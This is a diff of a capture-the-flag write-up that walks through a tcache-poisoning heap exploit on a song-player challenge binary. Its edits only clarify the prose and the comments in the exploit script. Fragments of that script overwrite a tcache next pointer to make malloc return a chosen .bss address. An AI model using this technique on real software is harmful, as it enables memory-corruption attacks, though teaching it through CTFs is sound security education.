@@ -274,12 +274,12 @@ Then we free `chunk A` and it ends up in the same bin:
 ```
 tcache bin 0x20 -> chunk A -> chunkB -> chunk X -> null
 ```
-When we play song #44 we are calling malloc(0). Even though we're asking for 0 bytes, this means chunk W will have a size of 0x20 (the smallest possible heap chunk). The heap manager will see that the tcache bin for 0x20 isn't empty, so it take the first chunk, `chunk A`, and return a pointer to the data section of `chunk A`. Now our tcache bin looks like this: 
+When we play song #44 we are calling malloc(0). Even though we're asking for 0 bytes, this means chunk W will have a size of 0x20 (the smallest possible heap chunk). The heap manager will see that the tcache bin for 0x20 isn't empty, so it will take the first chunk, `chunk A`, and return a pointer to the data section of `chunk A`. Now our tcache bin looks like this: 
 
 ```
 tcache bin 0x20 -> chunk B -> chunk X -> null
 ```
-Next the program reads UINT_MAX bytes from STDIN (fd = 0) into the data section of `chunk A`. We first write 0x10 (16) null bytes into the data section of A. Then we overwrite the next 8 bytes with null bytes. This is technically part of the header of `chunk B` but is used for the data of `chunk A` because this is tcache and `chunk A` is still considered "in use". Then we overwrite the size and AMP bits of `chunk B` with the same bytes that were already there (0x21). Now we've reached the pointer to the next chunk in the tcache bin, which we overwrite with a pointer to the the first song struct in the songs array, `songs[0]` (which is in the `.bss` section, _not the heap_). Specifically we can point it at the file descriptor, `songs[0].fd`. 
+Next the program reads UINT_MAX bytes from STDIN (fd = 0) into the data section of `chunk A`. We first write 0x10 (16) null bytes into the data section of A (we could theoretically write anything here). Then we overwrite the next 8 bytes with null bytes. This is technically part of the header of `chunk B` but is used for the data of `chunk A` because this is tcache and `chunk A` is still considered "in use". Then we overwrite the size and AMP bits of `chunk B` with the same bytes that were already there (0x21). Now we've reached the pointer to the next chunk in the tcache bin, which we overwrite with a pointer to the the first song struct in the songs array, `songs[0]` (which is in the `.bss` section, _not the heap_). Specifically we can point it at the file descriptor, `songs[0].fd`. 
 
 ```
 
@@ -311,7 +311,7 @@ When we next play a song of size 0 the program will call `malloc(0)` again, and 
 ```
 tcache bin 0x20 ->  0x404078
 ```
-Now when we play anothers song of size 0, the heap manager will give us `0x404078`!
+Now if we play another song of size 0, the heap manager will give us `0x404078`!
 
 ## Now let's use like every gdb add-on ever
 
@@ -343,7 +343,7 @@ remove_song("13") # free chunk X
 remove_song("12") # free chunk B
 remove_song("11") # free chunk A
 
-play_song("44") # Removes chunk A
+play_song("44") # Removes chunk A from tcache bin 0x20
 p.sendline("-1") 
 chunkA = p64(0x00) * 2 
 chunkB = p64(0x00) + p64(0x21) + p64(0x404078) # address of songs[0].fd
@@ -410,7 +410,7 @@ p.send(chunkA + chunkB)
 
 # tcache bin 0x20 -> chunk B -> 0x404078
 
-play_song("17") # Removes chunk B from tcache
+play_song("17") # Removes chunk B from tcache bin 0x20
 
 # tcache bin 0x20 -> 0x404078
 
@@ -717,9 +717,9 @@ p.send(chunkA + chunkB + chunkZ + chunkC) # Sends payload
 # tcache bin 0x310 -> C -> 0x404080 (songs[1])
 # tcache bin 0x3c0 -> L -> I -> G
 
-play_song("17") # Removes B from 0x20 bin
-play_song("18") # Removes 0x404078 from 0x20 bin and memsets songs[0].fd to 0 
-play_song("27") # Remove chunk C from 0x310 bin
+play_song("17") # Removes B from 0x20 tcache bin
+play_song("18") # Removes 0x404078 from 0x20 tcache bin and memsets songs[0].fd to 0 
+play_song("27") # Remove chunk C from 0x310 tcache bin
 
 # tcache bin 0x20  -> corrupted 
 # tcache bin 0x310 -> C -> 0x404c8 (songs[1].lyrics_ptr)
